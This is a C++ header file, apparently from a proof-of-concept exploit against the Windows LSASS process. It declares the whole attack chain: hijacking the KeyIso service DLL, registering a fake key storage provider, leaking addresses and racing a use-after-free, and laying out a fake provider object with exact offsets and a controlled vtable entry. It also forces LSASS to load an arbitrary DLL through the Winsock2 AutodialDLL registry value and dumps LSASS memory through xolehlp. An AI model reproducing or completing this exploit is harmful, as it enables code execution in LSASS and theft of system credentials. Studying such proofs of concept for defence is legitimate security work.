#pragma once

#include "common.h"
#include <bcrypt.h>

#define SERVICE_NAME_W_KEYISO L"KeyIso"

#define MODULE_NAME_A_KERNEL32 "kernel32.dll"
#define MODULE_NAME_A_XOLEHLP "xolehlp.dll"
#define MODULE_NAME_W_BCRYPT L"bcrypt.dll"
#define MODULE_NAME_W_LSASS L"lsass.exe"
#define MODULE_NAME_W_UCRTBASE L"ucrtbase.dll"
#define MODULE_NAME_W_XOLEHLP WIDE(MODULE_NAME_A_XOLEHLP)

#define FUNC_NAME_A_BCRYPTREGISTERPROVIDER "BCryptRegisterProvider"
#define FUNC_NAME_A_BCRYPTUNREGISTERPROVIDER "BCryptUnregisterProvider"
#define FUNC_NAME_A_BCRYPTADDCONTEXTFUNCTIONPROVIDER "BCryptAddContextFunctionProvider"
#define FUNC_NAME_A_BCRYPTREMOVECONTEXTFUNCTIONPROVIDER "BCryptRemoveContextFunctionProvider"
#define FUNC_NAME_A_BEGINTHREAD "_beginthread"
#define FUNC_NAME_A_QUEUEUSERWORKITEM "QueueUserWorkItem"

#define REG_PATH_W_KEYISO_PARAMETERS L"SYSTEM\\CurrentControlSet\\Services\\KeyIso\\Parameters"
#define REG_PATH_W_MSDTC L"SOFTWARE\\Microsoft\\MSDTC"
#define REG_PATH_W_WINSOCK2_PARAMETERS L"SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters"
#define REG_VALUE_NAME_W_AUTODIALDLL L"AutodialDLL"
#define REG_VALUE_NAME_W_DUMPTYPE L"MemoryDumpType"
#define REG_VALUE_NAME_W_MEMORYDUMPLOCATION L"MemoryDumpLocation"
#define REG_VALUE_NAME_W_KEYISO_SERVICEDLL L"ServiceDll"
#define REG_DATA_KEYISO_DEFAULT_SERVICEDLL L"%SystemRoot%\\system32\\keyiso.dll"
#define REG_DATA_WINSOCK2_DEFAULT_AUTODIALDLL L"C:\\Windows\\System32\\rasadhlp.dll"

#define STR_KEY_STORAGE_PROVIDER_NAME L"Vulnerable Key Storage Provider"

#define PROVIDER_SPRAY_COUNT 0x100
#define MEMBUF_SPRAY_COUNT 0x100
#define RACE_THREAD_COUNT 3
#define RACE_TIMEOUT 60000 // in ms
#define MAX_MEMORY_LEAK_ATTEMPTS 5
#define MAX_OPLOCK_ATTEMPTS 5

// Top 5 search engines + Top 5 social networks
// https://en.wikipedia.org/wiki/List_of_most-visited_websites
#define TOP_DOMAINS { "google.com", "baidu.com", "yandex.ru", "bing.com", "duckduckgo.com", "facebook.com", "instagram.com", "twitter.com", "tiktok.com", "reddit.com" }

typedef NTSTATUS(WINAPI* BCryptRegisterProvider)(LPCWSTR pszProvider, ULONG dwFlags, PCRYPT_PROVIDER_REG pReg);
typedef NTSTATUS(WINAPI* BCryptUnregisterProvider)(LPCWSTR pszProvider);
typedef NTSTATUS(WINAPI* BCryptAddContextFunctionProvider)(ULONG dwTable, LPCWSTR pszContext, ULONG dwInterface, LPCWSTR pszFunction, LPCWSTR pszProvider, ULONG dwPosition);
typedef NTSTATUS(WINAPI* BCryptRemoveContextFunctionProvider)(ULONG dwTable, LPCWSTR pszContext, ULONG dwInterface, LPCWSTR pszFunction, LPCWSTR pszProvider);

typedef struct _EXPLOIT_PARAMETERS
{
    LPWSTR KeyIsoDllPath;
    LPWSTR ProviderDllPath;
    LPCWSTR ProviderName;
    LPWSTR CatalogPath;
    LPWSTR OutputDirectoryPath;
    BOOL Force;
    BOOL Restore;
} EXPLOIT_PARAMETERS, * PEXPLOIT_PARAMETERS, * LPEXPLOIT_PARAMETERS;

typedef struct _EXPLOIT_INIT_STATE
{
    LPWSTR KeyIsoServiceDllPath;
    DWORD KeyIsoServiceState;
    LPWSTR WinsockAutodialDllPath;
    DWORD MsdtcDumpType;
    LPWSTR MsdtcDumpLocation;
} EXPLOIT_INIT_STATE, * PEXPLOIT_INIT_STATE, * LPEXPLOIT_INIT_STATE;

typedef struct _EXPLOIT_STATE
{
    DWORD KeyIsoServiceState;
    BOOL KeyIsoServiceDllPathSet;
    BOOL CatalogFileAdded;
    BOOL KeyStorageProviderRegistered;
    BOOL KeyStorageProviderDllCopied;
    BOOL WinsockAutodialDllRegistered;
    DWORD MsdtcDumpTypeCreatedOrUpdated;
    DWORD MsdtcDumpLocationCreatedOrUpdated;
} EXPLOIT_STATE, * PEXPLOIT_STATE, * LPEXPLOIT_STATE;

typedef struct _THREAD_CONTEXT
{
    RPC_BINDING_HANDLE hBinding;
    PVOID contextHandle;
    PVOID providerHandle;
    ULONG64 keyHandle;
    ULONG_PTR fakeProviderAddress;
} THREAD_CONTEXT, * PTHREAD_CONTEXT;

typedef struct _SIMPLE_FAKE_PROVIDER_OBJECT
{
    /* 0x0000 */ BYTE Padding0[0x8];
    /* 0x0008 */ DWORD RefCount; // Refcount of the fake Provider object, must be 1 to prevent double free of the object in LSASS.
    /* 0x0000 */ BYTE Padding1[0x70];
    /* 0x0080 */ PVOID VtableEntry; // Vtable entry of the fake provider object called by SrvCryptFreeKey, will contain the address of an arbitrary function.
    /* 0x0088 */ BYTE Padding2[0x90];
    /* 0x0118 */ PVOID Argument1; // Will contain the first argument of the function pointed to by VtableEntry.
    /* 0x0120 */ BYTE Padding3[0x40];
} SIMPLE_FAKE_PROVIDER_OBJECT, * PSIMPLE_FAKE_PROVIDER_OBJECT;

static_assert(offsetof(SIMPLE_FAKE_PROVIDER_OBJECT, RefCount) == 0x8, "Offset of SIMPLE_FAKE_PROVIDER_OBJECT.RefCount is incorrect.");
static_assert(offsetof(SIMPLE_FAKE_PROVIDER_OBJECT, VtableEntry) == 0x80, "Offset of SIMPLE_FAKE_PROVIDER_OBJECT.VtableEntry is incorrect.");
static_assert(offsetof(SIMPLE_FAKE_PROVIDER_OBJECT, Argument1) == 0x118, "Offset of SIMPLE_FAKE_PROVIDER_OBJECT.Argument1 is incorrect.");
static_assert(sizeof(SIMPLE_FAKE_PROVIDER_OBJECT) == 352, "Size of SIMPLE_FAKE_PROVIDER_OBJECT is incorrect.");

typedef struct _SIMPLE_FAKE_KEY_OBJECT
{
    DWORD signature;
    DWORD unknown1;
    int refcount;
    DWORD unknown2;
    LIST_ENTRY link;
    PSIMPLE_FAKE_PROVIDER_OBJECT provider;
    PVOID someptr;
    ULONG64 handle;
} SIMPLE_FAKE_KEY_OBJECT, * PSIMPLE_FAKE_KEY_OBJECT;

namespace Exploit
{
    /* Exploit main function. */
    BOOL Main(IN LPEXPLOIT_PARAMETERS Param);

    /* Modification of the KeyIso service so that it loads a DLL with known vulnerabilities. */
    BOOL PrepareKeyIsoService(IN LPEXPLOIT_PARAMETERS ExploitParams, IN OUT LPEXPLOIT_INIT_STATE ExploitInitState, IN OUT LPEXPLOIT_STATE ExploitState);
    VOID RestoreKeyIsoService(IN LPEXPLOIT_PARAMETERS ExploitParams, IN LPEXPLOIT_INIT_STATE ExploitInitState, IN OUT LPEXPLOIT_STATE ExploitState);

    /* Creation of a fake Key Storage Provider so that KeyIso loads a DLL with known vulnerabilities. */
    BOOL RegisterVulnerableKeyStorageProvider(IN LPEXPLOIT_PARAMETERS ExploitParams, IN OUT LPEXPLOIT_STATE ExploitState);
    VOID UnregisterVulnerableKeyStorageProvider(IN LPEXPLOIT_PARAMETERS ExploitParams, IN OUT LPEXPLOIT_STATE ExploitState);
    VOID DeleteVulnerableKeyStorageProviderDll(IN LPEXPLOIT_PARAMETERS ExploitParams, IN OUT LPEXPLOIT_STATE ExploitState);

    /* Implementation of the information leak and use-after-free exploits. */
    BOOL LeakProviderAddress(IN RPC_BINDING_HANDLE BindingHandle, IN PVOID ContextHandle, IN PVOID ProviderHandle, OUT PULONG_PTR LeakedAddress);
    DWORD WINAPI RaceSprayFakeKey(LPVOID Param);
    DWORD WINAPI RaceCreatePersistedKey(LPVOID Param);
    DWORD WINAPI RaceFreePersistedKey(LPVOID Param);
    VOID CreateRaceThreads(IN RPC_BINDING_HANDLE BindingHandle);
    DWORD WaitForRaceThreads(IN DWORD Milliseconds);
    VOID CloseRaceThreadHandles();

    /* Modification of the Winsock2 AutodialDLL parameter to force LSASS to load an arbitrary DLL. */
    BOOL RegisterAutodialDll(IN LPCWSTR ModuleName, IN OUT LPEXPLOIT_INIT_STATE ExploitInitState, IN OUT LPEXPLOIT_STATE ExploitState);
    BOOL UnregisterAutodialDll(IN LPEXPLOIT_INIT_STATE ExploitInitState, IN OUT LPEXPLOIT_STATE ExploitState);
    BOOL TriggerHttpRequestFromLsass(IN LPCSTR DomainName);

    /* MiniDumpWriteDump via xolehlp!WriteDumpThread. */
    BOOL FindXolehlpWriteDumpThreadAddress(OUT PULONG_PTR WriteDumpThreadAddress);
    BOOL RegisterMinidumpParameters(IN LPCWSTR DumpLocation, IN DWORD DumpType, IN OUT LPEXPLOIT_INIT_STATE ExploitInitState, IN OUT LPEXPLOIT_STATE ExploitState);
    BOOL UnregisterMinidumpParameters(IN OUT LPEXPLOIT_INIT_STATE ExploitInitState, IN OUT LPEXPLOIT_STATE ExploitState);
    BOOL TestXolehlpWriteDumpThread(IN ULONG_PTR WriteDumpThreadAddress, IN LPCWSTR DumpLocation);
    BOOL FindXolehlpDumpFilePath(IN LPCWSTR DumpLocation, IN LPSYSTEMTIME SystemTime, IN LPCWSTR ModuleName, OUT LPWSTR* DumpFilePath);

    /* Just in case something goes wrong with the PoC. */
    BOOL Restore();
}

namespace KeyStorageProvider
{
    BOOL Register(IN LPCWSTR ProviderName, IN LPCWSTR ImagePath);
    BOOL Unregister(IN LPCWSTR ProviderName);
}